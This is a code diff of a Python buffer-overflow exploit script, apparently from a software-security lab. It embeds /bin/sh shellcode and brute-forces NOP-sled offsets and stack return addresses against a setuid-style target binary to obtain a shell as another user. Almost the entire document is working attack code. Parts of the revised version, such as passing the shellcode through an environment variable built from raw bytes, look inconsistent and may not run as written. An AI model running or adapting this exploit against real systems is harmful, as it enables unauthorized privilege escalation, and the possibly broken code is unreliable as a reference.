@@ -8,40 +8,39 @@ shellcode = (
     b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 )
 
-stack_start = 0xffffd4cc
-ebp_offset = 44
-eip_offset = 48
-
-def run_exploit(payload):
+def run_exploit(offset, addr):
+    print(f"[*] Trying offset: {offset}, address: {hex(addr)}")
+    
+    # Construct the payload
+    payload = offset * b"\x90" + struct.pack("<I", addr)
+    
+    # Write the payload to a file
     with open("payload", "wb") as f:
         f.write(payload)
     
-    p = subprocess.Popen(["./sploit1"], stdin=open("payload", "rb"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    # Run the target program with the payload
+    p = subprocess.Popen(["/tmp/target1", payload], env={"SHELLCODE": shellcode}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output, error = p.communicate()
     
-    return b"targetuser" in output
-
-def build_payload(nop_length, eip_offset):
-    nop_sled = b"\x90" * nop_length
-    eip_address = struct.pack("<I", stack_start + eip_offset)
+    # Check if the exploit was successful
+    if b"targetuser" in output:
+        print(f"[+] Exploit succeeded with offset: {offset}, address: {hex(addr)}")
+        print(output.decode())
+        return True
     
-    padding_length = ebp_offset - len(nop_sled) - len(shellcode)
-    if padding_length < 0:
-        return None
-    
-    padding = b"A" * padding_length
-    
-    payload = nop_sled + shellcode + padding + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
-    return payload
+    return False
 
-for nop_len in range(1, 100):
-    for eip_off in range(-500, 500, 4):
-        payload = build_payload(nop_len * 4, eip_off)
-        if payload is None:
-            continue
-        
-        if run_exploit(payload):
-            print(f"Exploit succeeded with {nop_len*4} byte NOP sled and EIP overwrite {hex(stack_start + eip_off)}")
-            exit(0)
+def brute_force():
+    # Define the range of offsets and addresses to test
+    offset_range = range(0, 100, 4)
+    addr_range = range(0xbffff000, 0xc0000000, 0x1000)
+    
+    for offset in offset_range:
+        for addr in addr_range:
+            if run_exploit(offset, addr):
+                return
+    
+    print("[-] Exploit failed")
 
-print("Exploit failed")
+if __name__ == "__main__":
+    brute_force()
